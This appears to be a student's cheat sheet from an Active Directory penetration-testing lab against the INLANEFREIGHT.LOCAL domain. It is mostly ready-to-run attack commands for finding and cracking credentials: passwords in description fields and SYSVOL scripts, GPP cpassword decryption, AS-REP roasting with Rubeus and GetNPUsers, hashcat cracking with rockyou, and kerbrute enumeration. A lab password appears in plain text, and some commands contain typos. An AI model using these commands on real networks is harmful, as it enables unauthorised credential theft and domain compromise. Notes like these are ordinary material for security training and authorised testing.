
cube0x0/security-assessment git hub

powershell
```
Import-Module .\SecurityAssessment.ps1

Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

```
adidnsdump -u inlanefreight\\forend ldap://72.16.5.5 -r
```

view dns records
```
head records.csv
```

Finding password in the description field
```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
Finding password not required accounts
```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

Credentials in SMB shares and SYSVOL scripts
```
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
cat 
```
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset.vbs
```

cpassword attribute in Group Policy Preferences(GPP) files, they are .xml files in SYSVOL, use gpp-decrypt to get password
```
gpp-decrypt cpassword
```

Get-GPPPassword.ps1 can be used to search for GPP passwords, there is also a GPP Metasploit post module
```
crackmapexec smb -L | grep gpp
```

Registry.xml can hold passwords if autologon is covfigured via Group Policy.

using crackmapexec gpp_autologin module
```
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 - M gpp_autologin
```

```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol |fl
```
accounts given you can use rubeus
```
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
use hashcat once you snag the hash
```
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```




Hunting for users with kerberoast pre-auth not required

```
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

kerbrute can snag tas-rep for any users found that do not require kerb pre-auth
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

